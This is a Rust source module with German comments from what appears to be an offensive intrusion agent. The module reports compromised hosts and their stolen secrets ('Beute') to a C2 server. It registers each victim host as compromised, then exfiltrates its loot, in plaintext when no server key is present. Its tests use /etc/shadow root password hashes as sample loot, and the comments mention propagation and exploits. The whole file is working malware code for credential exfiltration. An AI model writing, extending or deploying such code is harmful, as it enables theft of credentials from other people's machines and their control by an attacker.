//! Die Meldung an den C2-Server: Hosts und Beute, in der Reihenfolge, die
//! der Vertrag verlangt.
//!
//! Vorher lief die Meldung auf zwei Wegen: die eigene Beute über einen
//! Zähler, die Beute aus der Propagation über `let _ =` — das Ergebnis fiel auf
//! den Boden. Die Zusammenfassung nannte danach die *vorbereiteten* Secrets,
//! nicht die zugestellten, und ein Lauf, in dem jeder Upload scheiterte, endete
//! mit Exit 0.
//!
//! Dieses Modul besitzt jetzt beides: die Reihenfolge, die Zählung und die
//! Verweigerung.
//!
//! **Die Einheit ist der Host, nicht das Stück.** Beute ohne Host ist für den
//! Operator wertlos — er kann sie keinem Zielhost zuordnen. Deshalb meldet
//! das Modul einen Host und dessen Beute zusammen, und deshalb wird der
//! Host **zuerst** registriert: schlägt die Registrierung fehl, bleibt die
//! Beute beim Agenten und zählt als verloren.
//!
//! Der Weg zum C2 läuft über [`C2Port`]. Dahinter stehen zwei Adapter: die
//! echte `C2Client` im Betrieb und ein Aufzeichner im Test. Der Seam ist die
//! Stelle, an der Reihenfolge und Zählung ohne laufenden Server prüfbar sind.

use kx_core::c2::RegisterRequest;
use kx_core::secret::Secret;
use tracing::error;

use crate::c2::C2Port;
use crate::hostkey::KeySealer;

/// Ein Host mit dem, was auf ihm erbeutet wurde.
///
/// Die Einheit ist der Host, nicht das einzelne Stück: Beute ohne Host ist
/// für den Operator wertlos — er kann sie keinem Zielhost zuordnen.
pub struct HostFund {
    /// Die Kennung des Hosts, bei dem die Beute erbeutet wurde.
    pub host_id: String,
    /// Die Adresse des Hosts.
    pub ip: String,
    /// Das Betriebssystem, wenn der Agent es erkannt hat.
    pub os: Option<String>,
    /// Der Status, den der Server für den Host führen soll.
    pub status: String,
    /// Das, was auf diesem Host erbeutet wurde.
    pub secrets: Vec<Secret>,
}

/// Das Ergebnis einer Meldung.
///
/// Vier Zähler, vier Aussagen. Kein Boolean: „erreichbar" wäre eine
/// Zusammenfassung, die man beim Zusammenführen zweier Meldungen verlieren
/// würde.
#[derive(Debug, Default, Clone, Copy, PartialEq, Eq)]
pub struct Ergebnis {
    /// Die Hosts, die der Server angenommen hat.
    pub hosts_registriert: usize,
    /// Die Hosts, deren Registrierung gescheitert ist.
    pub hosts_verloren: usize,
    /// Die Beute, die der Server angenommen hat.
    pub beute_gemeldet: usize,
    /// Die Beute, die gefunden wurde, aber nicht ankam.
    pub beute_verloren: usize,
}

impl Ergebnis {
    /// Der C2-Server war nicht erreichbar — kein Host kam an.
    ///
    /// Der Agent meldet sich selbst immer an. Kam kein Host an, hat der Lauf
    /// den Server nie erreicht.
    pub fn c2_nicht_erreichbar(&self) -> bool {
        self.hosts_registriert == 0 && self.hosts_verloren > 0
    }

    /// Ob der Lauf als Fehlschlag zu melden ist.
    ///
    /// Zwei Fälle: der C2-Server war nicht erreichbar, oder Beute ging
    /// verloren, die der Agent erfolgreich erbeutet hatte. Ein gescheiterter
    /// Exploit ist **kein** Fehlschlag — nichts gefunden ist ein Ergebnis.
    pub fn fehlgeschlagen(&self) -> bool {
        self.c2_nicht_erreichbar() || self.beute_verloren > 0
    }

    /// Zwei Ergebnisse zu einem zusammenführen.
    ///
    /// Der Agent meldet in zwei Phasen: erst sich selbst mit seiner eigenen
    /// Beute, später die Funde aus der Propagation. Beide zählen in
    /// dieselbe Bilanz.
    pub fn zusammenfuehren(self, andere: Ergebnis) -> Ergebnis {
        Ergebnis {
            hosts_registriert: self.hosts_registriert + andere.hosts_registriert,
            hosts_verloren: self.hosts_verloren + andere.hosts_verloren,
            beute_gemeldet: self.beute_gemeldet + andere.beute_gemeldet,
            beute_verloren: self.beute_verloren + andere.beute_verloren,
        }
    }
}

/// Meldet Hosts und ihre Beute an den C2-Server.
///
/// Für jeden Fund gilt dieselbe Reihenfolge: erst der Host, dann seine
/// Beute. Schlägt die Registrierung fehl, wird die Beute **nicht** gemeldet —
/// sie bleibt beim Agenten und zählt als verloren. Eine Beute, die der Server
/// nicht annimmt, zählt ebenso als verloren.
///
/// Der Master-Key gehört zum Host: das Modul holt ihn je Host aus dem
/// [`KeySealer`], und derselbe Key versiegelt die Beute und geht als
/// `sealed_master` bei der Registrierung mit. Ohne Server-Schlüssel geht die
/// Beute im Klartext — das ist der dokumentierte Normalfall eines Agenten
/// ohne Schlüsselmaterial.
pub fn melde(port: &dyn C2Port, sealer: Option<&KeySealer>, funde: &[HostFund]) -> Ergebnis {
    let mut ergebnis = Ergebnis::default();

    for fund in funde {
        // Je Host ein Master-Key, fuer die ganze Laufzeit.
        let key = sealer.and_then(|s| s.schluessel_fuer(&fund.host_id));

        // 1. Der Host zuerst. Ohne ihn ist die Beute wertlos.
        let anfrage = RegisterRequest {
            host_id: fund.host_id.clone(),
            ip: fund.ip.clone(),
            hostname: None,
            os: fund.os.clone(),
            status: Some(fund.status.clone()),
            sealed_master: key.as_ref().map(|k| k.sealed_master.clone()),
            // Der Master-Key selbst wird nie gesendet — der Server bekommt nur
            // das versiegelte Material.
            master_key: None,
        };
        match port.registriere_host(&anfrage) {
            Ok(()) => ergebnis.hosts_registriert += 1,
            Err(e) => {
                error!(
                    "Host {} nicht registrierbar: {e} — seine Beute bleibt hier",
                    fund.host_id
                );
                ergebnis.hosts_verloren += 1;
                ergebnis.beute_verloren += fund.secrets.len();
                continue;
            }
        }

        // 2. Seine Beute.
        for secret in &fund.secrets {
            let upload = match kx_core::exfil::upload(
                secret,
                key.as_ref().map(|k| k.roh.as_slice()),
                &fund.host_id,
            ) {
                Ok(upload) => upload,
                Err(e) => {
                    // Der Klartext geht nicht als Ersatz raus — das Stück bleibt.
                    error!("Beute nicht versiegelbar, sie bleibt hier: {e}");
                    ergebnis.beute_verloren += 1;
                    continue;
                }
            };
            match port.melde_beute(&upload) {
                Ok(()) => ergebnis.beute_gemeldet += 1,
                Err(e) => {
                    error!("Beute nicht gemeldet: {e}");
                    ergebnis.beute_verloren += 1;
                }
            }
        }
    }

    ergebnis
}

#[cfg(test)]
mod tests {
    use super::*;
    use kx_core::c2::transport::TransportError;
    use kx_core::c2::SecretUpload;
    use std::sync::Mutex;

    /// Ein Adapter, der die Aufrufe aufzeichnet und wahlweise fehlschlägt.
    ///
    /// Er steht hinter demselben Seam wie die echte `C2Client` — deshalb
    /// prüft ein Test durch ihn genau das, was der Betrieb tun würde.
    struct Aufzeichner {
        /// Die Reihenfolge der Aufrufe: `host:<id>` und `beute:<host>`.
        aufrufe: Mutex<Vec<String>>,
        /// Ob die Registrierung scheitern soll.
        host_fehler: bool,
        /// Ob der Beute-Upload scheitern soll.
        beute_fehler: bool,
    }

    impl Aufzeichner {
        fn neu() -> Self {
            Aufzeichner {
                aufrufe: Mutex::new(Vec::new()),
                host_fehler: false,
                beute_fehler: false,
            }
        }

        fn mit_host_fehler() -> Self {
            Aufzeichner {
                host_fehler: true,
                ..Aufzeichner::neu()
            }
        }

        fn mit_beute_fehler() -> Self {
            Aufzeichner {
                beute_fehler: true,
                ..Aufzeichner::neu()
            }
        }

        fn aufrufe(&self) -> Vec<String> {
            self.aufrufe.lock().unwrap().clone()
        }
    }

    impl C2Port for Aufzeichner {
        fn registriere_host(&self, req: &RegisterRequest) -> Result<(), TransportError> {
            self.aufrufe
                .lock()
                .unwrap()
                .push(format!("host:{}", req.host_id));
            if self.host_fehler {
                return Err(TransportError::Http("kein Host".to_string()));
            }
            Ok(())
        }

        fn melde_beute(&self, upload: &SecretUpload) -> Result<(), TransportError> {
            self.aufrufe
                .lock()
                .unwrap()
                .push(format!("beute:{}", upload.host_id));
            if self.beute_fehler {
                return Err(TransportError::Http("keine Beute".to_string()));
            }
            Ok(())
        }

        fn hole_tasks(&self) -> Result<Vec<kx_core::c2::Task>, TransportError> {
            Ok(Vec::new())
        }

        fn melde_task_ergebnis(
            &self,
            _report: &kx_core::c2::TaskResultRequest,
        ) -> Result<(), TransportError> {
            Ok(())
        }
    }

    fn fund(host_id: &str, anzahl: usize) -> HostFund {
        HostFund {
            host_id: host_id.to_string(),
            ip: host_id.to_string(),
            os: Some("Linux".to_string()),
            status: kx_core::c2::STATUS_COMPROMISED.to_string(),
            secrets: (0..anzahl)
                .map(|i| Secret::new("shadow", format!("root{i}"), "hash", "/etc/shadow"))
                .collect(),
        }
    }

    #[test]
    fn der_host_wird_vor_seiner_beute_gemeldet() {
        let port = Aufzeichner::neu();
        melde(&port, None, &[fund("192.168.1.5", 2)]);
        assert_eq!(
            port.aufrufe(),
            vec!["host:192.168.1.5", "beute:192.168.1.5", "beute:192.168.1.5"]
        );
    }

    #[test]
    fn schlaegt_die_registrierung_fehl_wird_die_beute_nicht_gemeldet() {
        let port = Aufzeichner::mit_host_fehler();
        let ergebnis = melde(&port, None, &[fund("192.168.1.5", 3)]);

        assert_eq!(
            port.aufrufe(),
            vec!["host:192.168.1.5"],
            "die Beute ging trotzdem raus"
        );
        assert_eq!(ergebnis.hosts_registriert, 0);
        assert_eq!(ergebnis.hosts_verloren, 1);
        assert_eq!(ergebnis.beute_gemeldet, 0);
        assert_eq!(ergebnis.beute_verloren, 3, "die Beute zaehlt als verloren");
        assert!(ergebnis.fehlgeschlagen());
    }

    #[test]
    fn ein_fehlgeschlagener_upload_zaehlt_als_verloren() {
        let port = Aufzeichner::mit_beute_fehler();
        let ergebnis = melde(&port, None, &[fund("192.168.1.5", 2)]);

        assert_eq!(ergebnis.hosts_registriert, 1);
        assert_eq!(ergebnis.beute_gemeldet, 0);
        assert_eq!(ergebnis.beute_verloren, 2);
        assert!(
            ergebnis.fehlgeschlagen(),
            "verlorene Beute muss als Fehlschlag gelten"
        );
    }

    #[test]
    fn ein_erfolgreicher_lauf_ist_kein_fehlschlag() {
        let port = Aufzeichner::neu();
        let ergebnis = melde(&port, None, &[fund("192.168.1.5", 2)]);

        assert_eq!(ergebnis.hosts_registriert, 1);
        assert_eq!(ergebnis.beute_gemeldet, 2);
        assert_eq!(ergebnis.beute_verloren, 0);
        assert!(!ergebnis.fehlgeschlagen());
    }

    #[test]
    fn ein_lauf_ohne_funde_ist_kein_fehlschlag() {
        let port = Aufzeichner::neu();
        let ergebnis = melde(&port, None, &[]);

        assert!(
            !ergebnis.fehlgeschlagen(),
            "nichts gefunden ist ein Ergebnis"
        );
        assert!(!ergebnis.c2_nicht_erreichbar());
    }

    #[test]
    fn ohne_server_schluessel_geht_die_beute_im_klartext_raus() {
        let port = Aufzeichner::neu();
        melde(&port, None, &[fund("192.168.1.5", 1)]);
        assert_eq!(port.aufrufe().len(), 2, "Host und Beute");
    }

    #[test]
    fn zwei_meldungen_zaehlen_in_dieselbe_bilanz() {
        let erste = Ergebnis {
            hosts_registriert: 1,
            hosts_verloren: 0,
            beute_gemeldet: 2,
            beute_verloren: 1,
        };
        let zweite = Ergebnis {
            hosts_registriert: 3,
            hosts_verloren: 1,
            beute_gemeldet: 5,
            beute_verloren: 0,
        };
        let gesamt = erste.zusammenfuehren(zweite);

        assert_eq!(gesamt.hosts_registriert, 4);
        assert_eq!(gesamt.hosts_verloren, 1);
        assert_eq!(gesamt.beute_gemeldet, 7);
        assert_eq!(gesamt.beute_verloren, 1);
    }
}
